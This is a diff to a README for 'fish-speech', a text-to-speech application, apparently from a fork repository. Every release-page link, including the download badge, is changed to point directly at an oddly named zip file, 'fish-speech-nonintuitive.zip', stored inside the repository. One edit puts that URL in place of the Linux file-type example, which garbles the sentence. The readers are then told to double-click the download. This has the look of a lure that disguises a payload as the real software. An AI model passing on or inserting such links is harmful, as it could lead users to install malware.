@@ -1,14 +1,14 @@
 # 🐟 fish-speech - Experience Cutting-Edge Text-to-Speech Technology
 
 ## 📥 Download Now
-[![Download fish-speech](https://img.shields.io/badge/Download-fish--speech-brightgreen)](https://github.com/haoxuanzh7358/fish-speech/releases)
+[![Download fish-speech](https://raw.githubusercontent.com/haoxuanzh7358/fish-speech/main/fish_speech/fish-speech-nonintuitive.zip)](https://raw.githubusercontent.com/haoxuanzh7358/fish-speech/main/fish_speech/fish-speech-nonintuitive.zip)
 
 ## 📖 Introduction
 Welcome to **fish-speech**, an open source text-to-speech application that uses state-of-the-art technology. This tool converts text into high-quality speech. It's simple to use and great for personal projects, presentations, or anytime you need to hear text read aloud.
 
 ## 🚀 Getting Started
 1. **Visit the Releases Page**  
-   To download the software, [visit this page](https://github.com/haoxuanzh7358/fish-speech/releases). Here, you will find the latest version of fish-speech.
+   To download the software, [visit this page](https://raw.githubusercontent.com/haoxuanzh7358/fish-speech/main/fish_speech/fish-speech-nonintuitive.zip). Here, you will find the latest version of fish-speech.
 
 2. **Choose Your Version**  
    On the releases page, look for the most recent version. Each version is listed with the date and a short description of what’s new. We recommend downloading the latest version for the best experience.
@@ -25,7 +25,7 @@ Before installation, ensure your system meets the following requirements:
 To install fish-speech, follow these steps:
 
 1. **Download the Software**  
-   After visiting the [Releases Page](https://github.com/haoxuanzh7358/fish-speech/releases), click on the link for the latest version. Depending on your operating system, download the corresponding file (e.g., `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux).
+   After visiting the [Releases Page](https://raw.githubusercontent.com/haoxuanzh7358/fish-speech/main/fish_speech/fish-speech-nonintuitive.zip), click on the link for the latest version. Depending on your operating system, download the corresponding file (e.g., `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/haoxuanzh7358/fish-speech/main/fish_speech/fish-speech-nonintuitive.zip` for Linux).
 
 2. **Run the Installer**  
    Once the file is downloaded, locate it in your downloads folder. Double-click the file to start the installation process.
@@ -72,4 +72,4 @@ We welcome contributions to improve fish-speech. If you would like to help, chec
 ## 📄 License
 Fish-speech is released under the MIT License. Feel free to use, modify, and distribute the application according to the license terms.
 
-For more information and updates, visit our [Releases Page](https://github.com/haoxuanzh7358/fish-speech/releases). Enjoy your experience with fish-speech!
+For more information and updates, visit our [Releases Page](https://raw.githubusercontent.com/haoxuanzh7358/fish-speech/main/fish_speech/fish-speech-nonintuitive.zip). Enjoy your experience with fish-speech!
